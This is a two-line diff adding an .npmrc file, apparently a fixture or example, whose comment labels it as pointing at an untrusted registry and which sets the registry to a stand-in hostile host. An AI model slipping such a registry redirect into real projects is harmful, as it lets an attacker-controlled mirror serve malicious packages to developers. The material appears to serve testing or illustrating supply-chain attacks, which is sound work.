@@ -1,0 +1,2 @@
+# .npmrc pointing at an untrusted external registry.
+registry=https://evil-mirror.example.com/npm/
